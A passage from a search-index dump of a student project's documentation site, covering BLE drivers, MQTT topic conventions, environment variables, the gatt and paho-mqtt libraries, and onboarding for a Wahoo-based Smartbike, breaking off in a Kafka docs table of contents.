Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#resistance-control","content":" A new resistance value can be set by writing to the ftms_control_point characteristic - UUID.  The value must be an integer between 0 and 100 - representing a percentage - and converted to a byte array. It must be paired with the FTMS_SET_TARGET_RESISTANCE_LEVEL OP code.  The ftms_set_target_resistance_level method can be passed the integer value to set the new resistance.  ","version":"Next","tagName":"h2"},{"title":"MQTT Topics​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#mqtt-topics","content":" Subscribed topics messages are processed by the custom MQTT client.  ","version":"Next","tagName":"h2"},{"title":"Data Topics​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#data-topics","content":" Topic\tDatabike/{DEVICE_ID}/speed\tSpeed data bike/{DEVICE_ID/cadence\tCadence data bike/{DEVICE_ID}/power\tPower data  This should be changed to conform to the MQTT Topics documents convention:  bike/{DEVICE_ID}/speed/reportbike/{DEVICE_ID/cadence/reportbike/{DEVICE_ID}/power/report  ","version":"Next","tagName":"h3"},{"title":"Incline Topic​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#incline-topic","content":" The incline is controlled using the topic:  bike/{DEVICE_ID}/incline  With the package expected to be only an integer.  This should be changed to conform to the MQTT Topics documents convention:  bike/{DEVICE_ID}/incline/control  ","version":"Next","tagName":"h3"},{"title":"Resistance Topic​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#resistance-topic","content":" The resistance is controlled using the topic:  bike/{DEVICE_ID}/resistance  With the package expected to be only an integer.  This should be changed to conform to the MQTT Topics documents convention:  bike/{DEVICE_ID}/resistance/control  ","version":"Next","tagName":"h3"},{"title":"MQTT Payload​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#mqtt-payload","content":" The data (speed, cadence, power) payload follows a JSON structure:  { 'value' : [cadence | speed | power] 'unitName' : [a unit metric relevent to the data type] 'timestamp' : [the time at publish] 'metadata' : { 'deviceName' : [some identifier of the publishing device] } }   ","version":"Next","tagName":"h2"},{"title":"Driver Location​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#driver-location","content":" This driver has two parts:  Core driver code - Drivers/kickr_climb_and_smart_trainer/wahoo_device.pyDriver starter - Drivers/kickr_climb_and_smart_trainer/incline_and_resistance_control.py  ","version":"Next","tagName":"h2"},{"title":"An Alternative Driver​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#an-alternative-driver","content":" Two alternative driver wahoo_controller.py and smartbike.py were developed to implement many of the above requirements. wahoo_controller.py works and has a starter wahoo_controller_starter.py. smartbike.py is an extension of wahoo_controller.py to cover all drivers but was developed late and is not functional (I would not recommand using it).  Important! The VR game's incline control was developed to use the improved incline control payload used by the wahoo_controller.py driver. You should use the wahoo_controller.py driver over the kickr_climb_and_smart_trainer driver.  Location - Drivers/smartbike_driver/smartbike/ ","version":"Next","tagName":"h3"},{"title":"MQTT Topics","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Topics","content":"","keywords":"","version":"Next"},{"title":"Device IDs​","type":1,"pageTitle":"MQTT Topics","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Topics#device-ids","content":" As the Smartbike is still in a prototyping phase and there are only two of them, the device ids of the Smartbikes are below:  Smartbike\tIDBike 1\t000001 Bike 2\t000002  ","version":"Next","tagName":"h2"},{"title":"Sub-Topics​","type":1,"pageTitle":"MQTT Topics","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Topics#sub-topics","content":" Sub-topics define the direction and type of data being published:  Sub-topic\tDirection of Communication\tType of Datacontrol\tBike ← App\tActuating report\tBike → App\tSensing status\tBike ↔ App\tError/Status  Important! The status sub-topic is not yet implemented in any drivers or applications.  ","version":"Next","tagName":"h2"},{"title":"Topics​","type":1,"pageTitle":"MQTT Topics","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Topics#topics","content":" Refer to driver's documentation for implemented topic details  All implemented topics are split into two categories: actuating and sensing.  Actuating topics may not have a report sub-topic, and if they do, it may only report meta data such as accepted values.  Sensing topics may not have a control sub-topic.  Topic\tDescriptionincline\tControl KICKR Climb incline resistance\tControl KICKR smart trainer pedal resistance fan\tControl the Wahoo Headwind Fan power speed\tRead the m/s speed value of the KICKR smart trainer cadence\tRead the RPM cadence value of the KICKR smart trainer power\tRead the Wattage power value of the KICKR smart trainer heartrate\tRead the BPM of the TICKR heart rate monitor  ","version":"Next","tagName":"h2"},{"title":"Payload Structure​","type":1,"pageTitle":"MQTT Topics","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Topics#payload-structure","content":" Refer to driver's documentation for expected payload structure.  Data published to topics, either by the Smartbike or an application, should follow a predictable JSON structure, including:  The values of interest with appropriately named keysA timestamp for time-of-publicationAny useful descriptive metadata  Example - cadence/report publish:  { &quot;value&quot;: 6.0, &quot;unitName&quot;: &quot;RPM&quot;, &quot;timestamp&quot;: 1722834169.6118855, &quot;metadata&quot;: { &quot;deviceName&quot;: &quot;bike000001&quot; } }   ","version":"Next","tagName":"h2"},{"title":"Example Topics​","type":1,"pageTitle":"MQTT Topics","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Topics#example-topics","content":" bike/000001/incline/control will change the incline of the KICKR Climb when valid values are published to it.  bike/000001/speed/report will forward speed value updates from the Smartbike if subscribed to.  ","version":"Next","tagName":"h2"},{"title":"Further Information​","type":1,"pageTitle":"MQTT Topics","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Topics#further-information","content":" See our MQTT client-class.  View implemented topics in the drivers' code:  KICKR Smart Trainer &amp; ClimbWahoo Headwin FanTICKR Heart Rate MonitorWahoo Cadence SensorButton Driver ","version":"Next","tagName":"h2"},{"title":"Environment Variables","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Environment-Variables","content":"","keywords":"","version":"Next"},{"title":"Variables​","type":1,"pageTitle":"Environment Variables","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Environment-Variables#variables","content":" Some vairables of interest include:  Variable\tDescriptionDEVICE_ID\tID of the Smartbike - used in MQTT topics MQTT_HOSTNAME\tMQTT broker host address MQTT_PORT\tMQTT broker port MQTT_USERNAME\tConfigured MQTT username MQTT_PASSWORD\tConfigured MQTT password KICKR_MAC_ADDRESS\tKICKR smart trainer MAC address used by driver to connect via BLE HEART_RATE_ALIAS_PREFIX\tBLE advertised name of the TICKR heart rate monitor - used by driver to connect via BLE CADENCE_ALIAS_PREFIX\tBLE advertised name of the Wahoo cadence sensor - used by driver to connect via BLE FAN_ALIAS_PREFIX\tBLE advertised name of the Wahoo headwind fan - used by driver to connect via BLE HEART_RATE_ADAPTER_NAME\tAdapter address of the Raspberry Pi's BLE adapter - used by drivers to connect via BLE - the same value for FAN_ADAPTER_NAME &amp; CADENCE_ADAPTER_NAME  ","version":"Next","tagName":"h2"},{"title":"Adding, Removing, & Editing Variables​","type":1,"pageTitle":"Environment Variables","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Environment-Variables#adding-removing--editing-variables","content":" To modify the .env file open the .env file in the home directory using nano:  nano .env   ","version":"Next","tagName":"h2"},{"title":"Loading using bash script​","type":1,"pageTitle":"Environment Variables","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Environment-Variables#loading-using-bash-script","content":" To load the environment variables using a bash script add the following:  # at top of script source ~/.env ... # print value echo $DEVICE_ID # use as a string echo &quot;Smartbike ID: ${DEVICE_ID}&quot;   ","version":"Next","tagName":"h2"},{"title":"Passing to python using bash script​","type":1,"pageTitle":"Environment Variables","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Environment-Variables#passing-to-python-using-bash-script","content":" To parse the variable to a python program, the python program must include the python shebang at the top of the file and configure an ArgumentParser using the argparse module:  #!/usr/bin/env python3 import os from argparse import ArgumentParser ... # initialise parser parser = ArgumentParser() parser.add_argument('--device_id', dest='device_id', type=str, help=&quot;Smartbike unique id&quot;, default=os.getenv('DEVICE_ID')) # load parsed arguments args = parser.parse_args() ... # use argument print(f'Smartbike ID: {args.device_id}')   To parse the variables from the bash script to the python program - indicate the variable and values when instigating the python program parsing the variables as string:  source ~/.env ... python3 ~/iot/Drivers/my-driver/driver.py --device_id ${DEVICE_ID}   Order of parsed named arguments does not matter.  ","version":"Next","tagName":"h2"},{"title":"Loading without parsing in python​","type":1,"pageTitle":"Environment Variables","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Environment-Variables#loading-without-parsing-in-python","content":" To load the variables without parsing explicitly from the bash script. Load the variables normally in the bash script and instigate the python program:  source ~/.env ... python3 ~/iot/Drivers/my-driver/driver.py   In the python program use the os module to load the environment variables directly:  #!/usr/bin/env python3 import os ... device_id = os.getenv('DEVICE_ID')   ","version":"Next","tagName":"h2"},{"title":"Further Information​","type":1,"pageTitle":"Environment Variables","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Environment-Variables#further-information","content":" More information on argparseMore information on shebangs ","version":"Next","tagName":"h2"},{"title":"GATT Code","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT","content":"","keywords":"","version":"Next"},{"title":"Installing gatt library​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#installing-gatt-library","content":" To install run the following pip command:  pip install gatt   ","version":"Next","tagName":"h2"},{"title":"Import Library​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#import-library","content":" The gatt library provides two classes which together manage and connect to BLE GATT enabled devices: DeviceManager &amp; Device.  import gatt   ","version":"Next","tagName":"h2"},{"title":"DeviceManager​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#devicemanager","content":" The DeviceManager class discovers and manages BLE devices.  # create a manager manager = gatt.DeviceManager(adapter_name='hci0') ... # create and connect managed device device = gatt.Device('XX:XX:XX:XX:XX:XX', manager) device.connect() ... # run manager manager.run() ... # cleanly stop manager manager.stop()   ","version":"Next","tagName":"h2"},{"title":"Initialisation​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#initialisation","content":" To initialise a DeviceManager pass it the BLE adapter address (most likely hc10):  manager = gatt.DeviceManager(adapter_name='hci0')   ","version":"Next","tagName":"h3"},{"title":"Managing Device​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#managing-device","content":" When creating a Device pass a DeviceManager to manage it:  device = gatt.Device('XX:XX:XX:XX:XX:XX', manager)   ","version":"Next","tagName":"h3"},{"title":"Run​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#run","content":" To run call DeviceManager.run():  manager.run()   ","version":"Next","tagName":"h3"},{"title":"Terminate​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#terminate","content":" To cleanly terminate use DeviceManager.stop():  manager.stop()   ","version":"Next","tagName":"h3"},{"title":"Device​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#device","content":" The Device class is responsible for connecting to the device and discovering Services &amp; Characteristics of the device.  ","version":"Next","tagName":"h2"},{"title":"Initialisation​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#initialisation-1","content":" device = gatt.Device(mac_address: str, manager: gatt.DeviceManager, managed: bool=True)   Parameter\tType\tDescriptionmac_address\tstr\tthe mac address of the target device manager\tgatt.DeviceManager\tA DeviceManager for managing the Device managed\tbool [Default True]\tIn theory you could manage the device explicitly in which case you would set managed to False - but there is no reason to do this.  ","version":"Next","tagName":"h3"},{"title":"Connecting to device​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#connecting-to-device","content":" To connect using Device.connect():  device.connect()   The callback methods connect_succeeded and connect_failed can be overriden to log or handle any errors during connection.  ","version":"Next","tagName":"h3"},{"title":"Discovering Services & Characteristics​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#discovering-services--characteristics","content":" Upon successfully connecting to the device the services_resolved method is called. This method automatically discovers and appends all services of the device to the Device.services property and should be extended to discover any services or characteristics of interest like so:  class AnyDevice(gatt.Device): ... def set_service_or_characteristic(self, service_or_characteristic): # match using UUID if service_or_characteristic.uuid == 'XXXXXXXX-XXXX-...': self.service_or_characteristic_of_interest = service_or_characteristic def service_resolve(self): super().services_resolved() for service in self.services: self.set_service_or_characteristic(service) for characteristic in service: self.set_service_or_characteristic(characteristic) ... # any other operations needed   ","version":"Next","tagName":"h3"},{"title":"Control Point Callbacks​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#control-point-callbacks","content":" After an operation is sent to a control point (read/writing a value, enabling notification, requesting control, etc) the control point will return a response. A set of callback methods should be overriden to perform any necessary operation's response:  Callback Method\tParameters\tResponse Typecharacteristic_write_value_succeeded\tcharacteristic\tThe characteristic write operation succeeded and the value has been updated characteristic_write_value_failed\tcharacteristic, error\tThe characteristic write operation failed with the following error characteristic_enable_notification_succeeded\tcharacteristic\tNotification on the characteristic has been enabled characteristic_enable_notification_failed\tcharacteristic, error\tNotification has not been enabled on the requested characteristic with the following error characteristic_value_updated\tcharacteristic, value\tA notification enabled characteristic has updated with the following value  These methods should be overriden to log, trigger methods for updated values, and handle errors.  ","version":"Next","tagName":"h3"},{"title":"Service​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#service","content":" The Service class handles GATT services of devices. It has the following properties:  Property\tDescriptionuuid\tThe unique uuid of the service for identifying it characteristics\tA list of the Service's Characteristics.  ","version":"Next","tagName":"h2"},{"title":"Characteristic​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#characteristic","content":" The Characteristic class handles GATT characteristics of services/devices. It has a unique uuid for identification stored in its uuid property.  ","version":"Next","tagName":"h2"},{"title":"Reading Values​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#reading-values","content":" To read the value of a Characteristic use the Characteristic.read_value() method:  value = characteristic_of_interest.read_value()   Values are returned as an array of bytes. Depending on the expected use of the value it may be converted into a str or int, the bytes may also be a set of flags and values which require bit operations to extract the values from.  ","version":"Next","tagName":"h3"},{"title":"Enabling Notification​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#enabling-notification","content":" Better than explicitly reading a characteristic's value is being notified and given a value when the characteristic updates. Use the Characteristic.enable_notifications() method to enable notification. When the value is updated the Device callback method characteristic_value_updated is called.  ","version":"Next","tagName":"h3"},{"title":"Writing Values​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#writing-values","content":" Values written to a characteristic must be in a bytearray data type. To write a new value use the Characteristic.write_value():  # Convert the value to write into a bytes array value_to_write = bytearray('Hello World!') # write the value to the characteristic characteristic_of_interest.write_value(value_to_write)   ","version":"Next","tagName":"h3"},{"title":"Updated gatt library​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#updated-gatt-library","content":" The version of the gatt library available through pip is outdated compared to the one available on the GitHub repo. As such a local updated version of the library has been created in the Drivers/lib/ folder under the gatt/ folder. To load this version use:  import lib.gatt.gatt_linux as gatt   ","version":"Next","tagName":"h2"},{"title":"Descriptor​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#descriptor","content":" This version contains the Descriptor class. Descriptors can hold useful meta data describing the expect values and use of a characteristic. In this version of the library, each Characteristic has a Descriptors array property:  description = characteristic_of_interest.descriptors # convert to string print(str(description))   Limited use of the Descriptor class and descriptors property has occurred - Wahoo devices appear to lack any meta data in their descriptors.  ","version":"Next","tagName":"h3"},{"title":"Further Information​","type":1,"pageTitle":"GATT Code","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/GATT#further-information","content":" For more information on GATT protocolFor the gatt library's source codeFor the gatt library's documentationFor the updated gatt library Drivers/lib/gatt/gatt_linux.py ","version":"Next","tagName":"h2"},{"title":"MQTT Client","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client","content":"","keywords":"","version":"Next"},{"title":"Paho-MQTT​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#paho-mqtt","content":" The paho-mqtt library, based on the Eclipse Mosquitto MQTT broker, is used for MQTT functionality.  ","version":"Next","tagName":"h2"},{"title":"Installation​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#installation","content":" To install the library run the follow command  pip install paho-mqtt  ","version":"Next","tagName":"h3"},{"title":"Library Documentation & Source Code​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#library-documentation--source-code","content":" To find out more about paho-mqtt view the documentation or source code.  ","version":"Next","tagName":"h3"},{"title":"MQTTClient​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#mqttclient","content":" To simplify and standardise using MQTT, a paho based client-class (MQTTClient) has been implemented in Drivers/lib/mqtt_client.py and should be used in all drivers and programs using MQTT.  from lib.mqtt_client import * ... # define credentials and broker details broker_address = 'example_address' username = 'ExampleUsername' password = 'Ex@mpLeP@Ssw0rd' port = 1883 # Create &amp; setup client client = MQTTClient(broker_address, username, password, port) client.setup_mqtt_client() # Subscribe to topics client.subscribe('example/1') ... # Publish on some event def my_event(): payload = json.dumps( { ... } ) client.publish('example/2', payload) ... # start the client client.loop_start()   ","version":"Next","tagName":"h2"},{"title":"Import & Create Client​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#import--create-client","content":" Import the client-class from Drivers/lib/, create a client-object, and setup the connection to the broker using:  from lib.mqtt_client import * ... broker_address = 'example_address' username = 'ExampleUsername' password = 'Ex@mpLeP@Ssw0rd' port = 1883 client = MQTTClient(broker_address, username, password, port) client.setup_mqtt_client()   MQTTClient(broker_address: str, username: str, password: str, port: int=1883)  Parameter\tType\tDescription\texamplebroker_address\tstring\tMQTT broker host address\tmqtt.example.address username\tstring\tConfigured account username\tExampleUsername password\tstring\tConfigured account password\tEx@mpLeP@Ssw0rd port\tinteger\tPort of the MQTT broker [default 1883]\t1883, 8883, ...  ","version":"Next","tagName":"h3"},{"title":"Subscribing to Topic​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#subscribing-to-topic","content":" Subscribing to a topic in MQTT will have your client receive all messages published to that topic. When a message is received it will trigger the client.on_message() method.  client.subscribe('example/1')   client.subscribe(topic_name: str)  Paramater\tType\tDescription\texampletopic_name\tstring\tTopic to subscribe to\tbike/000001/speed/report  ","version":"Next","tagName":"h3"},{"title":"Publish to Topic​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#publish-to-topic","content":" Publishing to a topic in MQTT will send the payload to all clients subscribed to that topic.  payload = json.dumps( { ... } ) client.publish('example/2', payload)   publish(topic_name: str, payload: any)  Paramater\tType\tDescription\texampletopic_name\tstring\tTopic to publish to\tbike/000001/incline/control payload\tany\tMessage to send - it does not need to be a JSON but it is good practice.\t{ 'incline' : 19, 'ts' : 1722834170.603658 }, 'Hello World!', [True, False], -10, etc.  ","version":"Next","tagName":"h3"},{"title":"on_message​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#on_message","content":" To do something when a message is received by a subscribed topic, the client-class needs to be sub-classed to extend its client.on_message() method.  class MyChildClient(MQTTClient): def __init__(self, broker_address, username, password, device): super().__init__(broker_address, username, password) self.device = device def on_message(self, client, userdata, msg): super().on_message(client,userdata, msg) self.device.on_message(msg)   The topic-of-origin (msg.topic) of the message should be checked if subscribing to more than one topic. The message then needs to be decoded and converted into its expected data structure.  class Device: ... def on_message(self, msg): # check msg topic of origin if self.device_topic != msg.topic: return # decode the payload decoded_payload = str(msg.payload, 'utf-8') # convert to expected data structure dict_payload = json.loads(decoded_payload) # use payload values ...   client.on_message(client, userdata, msg)  Refer to paho-mqtt documentation for more information.  ","version":"Next","tagName":"h3"},{"title":"loop_forever & loop_start​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#loop_forever--loop_start","content":" Before being able to publish and receive messages the client loop must first be started using one or two methods:  client.start_loop()   Will start the client loop in a separate thread allowing continued procedure of execution.  client.loop_forever()   Will start the client loop in a blocking function preventing further execution of code.  These loops will attempt to reconnect if the connection is lost but will also timeout if unable to reconnect.  ","version":"Next","tagName":"h3"},{"title":"Further Information​","type":1,"pageTitle":"MQTT Client","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/MQTT-Client#further-information","content":" For more information on paho-mqtt:  See the documentation.See the source code.  For our MQTT client-class &amp; topics:  Client-class codeTopics ","version":"Next","tagName":"h2"},{"title":"Developer Environment Setup","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/introduction/Developer-Environment-Setup","content":"","keywords":"","version":"Next"},{"title":"General Needs​","type":1,"pageTitle":"Developer Environment Setup","url":"/redback-documentation/docs/project-1/iot/introduction/Developer-Environment-Setup#general-needs","content":" You still require general things like: General Needs To get started on the Smartbike project, ensure you have the following general tools set up:  IDE of Your Choice: Use an Integrated Development Environment (IDE) such as Visual Studio Code, PyCharm, or Atom. Make sure to install any extensions related to Python and Raspberry Pi development.  IDE of your choice.GitHub Desktop app or GitHub CLI or equivalent.  GitHub Desktop App or GitHub CLI: You’ll need one of these tools to manage version control and work with the repositories. Alternatively, you can use other Git tools like GitKraken or SourceTree.  ","version":"Next","tagName":"h2"},{"title":"Project Repositories​","type":1,"pageTitle":"Developer Environment Setup","url":"/redback-documentation/docs/project-1/iot/introduction/Developer-Environment-Setup#project-repositories","content":" Fork the Redback Operation repositories, and bookmark both the original and personal-forks for ease of access.  IoT RepoDocumentation RepoVR repo  Clone the repositories to your PC to be ready for development.  ","version":"Next","tagName":"h2"},{"title":"Tools for the Smartbike & Raspberry Pi​","type":1,"pageTitle":"Developer Environment Setup","url":"/redback-documentation/docs/project-1/iot/introduction/Developer-Environment-Setup#tools-for-the-smartbike--raspberry-pi","content":" To ease development on the Raspberry Pi it is recommended to prepare the following tools to assist in development:  PuTTY or equivalent - for accessing the Raspberry Pi.FileZilla or WinSCP or equivalent FTP application - for transfering files between your development environment and the Raspberry Pi.Install dependencies such as Python's gatt library and paho MQTT - for hints during development.Use the following commands: pip install gatt paho-mqtt These libraries are crucial for working with the Smartbike’s IoT functionality and network communication.  ","version":"Next","tagName":"h2"},{"title":"Personal Mobile Hotspot​","type":1,"pageTitle":"Developer Environment Setup","url":"/redback-documentation/docs/project-1/iot/introduction/Developer-Environment-Setup#personal-mobile-hotspot","content":" The Raspberry Pi currently (T2 2024) connects to the internet through connecting to someone's personal mobile hotspot on their phone. As long as you have the same SSID and password setup it will be able to connect. Reach out to your project lead (or if you are the lead read the handover document) for the SSID and password to set.  ","version":"Next","tagName":"h2"},{"title":"Ready to Start​","type":1,"pageTitle":"Developer Environment Setup","url":"/redback-documentation/docs/project-1/iot/introduction/Developer-Environment-Setup#ready-to-start","content":" Ask your project lead for tasks to get started on or...  See the Planner on Teams for tasks (it is like Trello).Delve into the code ","version":"Next","tagName":"h2"},{"title":"Onboarding Welcome","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/introduction/Onboarding-Welcome","content":"Last updated by: KasparByrne, Last updated on: '23/09/2024' Last updated by: KasparByrne, Last updated on: '23/09/2024' Onboarding Welcome Project 1 - Smartbike VR combines our physical Smartbike with our self-developed applications to enhance exercise through gamification and technology. Project 1 is split into three teams, the VR team is responsible for development of the VR game, the IoT team is responsible for the Smartbike and any other IoT requirements, and the mobile team is responsible for the development of the mobile app. The IoT team is primarily focused on the development of the Smartbike, with the goal of producing an API like interface for other applications to use the Smartbike. As a member of the IoT team, whether you are a leader, senior, or junior, you will help achieve this goal by: Developing and maintaining an interface which allows other applications to command and read data from the Smartbike system.Collaborate and communicate with other teams to identify IoT functional requirements and develop solutions.Document solutions so that future teams may use and modify them. By adhering to these three ideas, you can ensure that your contributions will have a meaningful, and hopefully long-term, impact on the project's progress. The Smartbike If you are joining this team then you are likely interested in our Smartbike. The Smartbike is largely an off-the-shelf product, an indoor exercise bike produced by a company called Wahoo. It can do a bunch of cool things including: Changing the incline of the bike to simulating going up-and-down hills.Simulate the speed of the bike.Detect cadence &amp; power.Increase resistance of the pedals - making it easier or harder to pedal.Simulating a headwind using a controlled fan positioned in from of the bike. More technically interesting, is that the Wahoo indoor exercise bike does not have an API or anyway to interface with the bike beyond their app. Previous team members had to reverse engineer the BLE connections between its components and the app to interface with it. The bike relies on the BLE protocol Generic Attribute (GATT) to communicate between its components (for more on GATT see our documentation). Unfortunately, the reverse engineering process was not documented but there are tutorials on the internet if you are interested. A Raspberry Pi was setup to directly connect and control the bike's components using GATT and the information figure out by reverse engineering. To communicate externally, with applications like the VR game and mobile app, the Smartbike uses MQTT. If you are not familiar with MQTT it is very simple and you can find resources online to learn it in less than 20-minutes. Project 1 Repositories Project 1 uses multiple repositories. You will likely need to contribute to all of them - so it is a good idea to bookmark and fork all of them ASAP: IoT RepoDocumentation RepoVR repo What Next? Setup your developer environmentLearn more about the SmartbikeLearn how to start the SmartbikeDelve into the code!","keywords":"","version":"Next"},{"title":"Kafka Python Documentation - Table of Contents","type":0,"sectionRef":"#","url":"/redback-documentation/docs/orion-backend/kafkadocs/","content":"","keywords":"","version":"Next"},{"title":"sidebar_position: 3​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#sidebar_position-3","content":" ","version":"Next","tagName":"h2"},{"title":"Introduction​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#introduction","content":" Project OverviewKey FeaturesQuick StartUse Cases  ","version":"Next","tagName":"h2"},{"title":"Installation​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#installation","content":" RequirementsSetup InstructionsEnvironment ConfigurationTroubleshooting Installation  ","version":"Next","tagName":"h2"},{"title":"Core Concepts​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#core-concepts","content":" Kafka Architecture OverviewProducer-Consumer ModelTopics and PartitionsMessage Delivery Semantics  ","version":"Next","tagName":"h2"},{"title":"Getting Started​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#getting-started","content":" Basic SetupSimple Producer ExampleSimple Consumer ExampleConfiguration Options  ","version":"Next","tagName":"h2"},{"title":"API Reference​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#api-reference","content":" Producer APIConsumer API  ","version":"Next","tagName":"h2"},{"title":"Advanced Usage​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#advanced-usage","content":" Serialization and DeserializationError Handling and Retry MechanismsPerformance TuningMonitoring and Metrics  ","version":"Next","tagName":"h2"},{"title":"Deployment​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#deployment","content":" Production Best PracticesScaling ConsiderationsContainerization with DockerCloud Deployment Options  ","version":"Next","tagName":"h2"},{"title":"Examples​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#examples","content":" Basic ExamplesReal World ScenariosIntegration with Other SystemsBatch ProcessingStream Processing  ","version":"Next","tagName":"h2"},{"title":"Contributing​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#contributing","content":" Development SetupCode Style GuidelinesTestingPull Request process  ","version":"Next","tagName":"h2"},{"title":"Troubleshooting​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#troubleshooting","content":" Common IssuesDebugging TipsFAQ  ","version":"Next","tagName":"h2"},{"title":"Appendix​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#appendix","content":" GlossaryAdditonal ResourcesVersion History  Project Overview  ","version":"Next","tagName":"h2"},{"title":"Kafka Python Backend for Crowd Monitoring​","type":1,"pageTitle":"Kafka Python Documentation - Table of 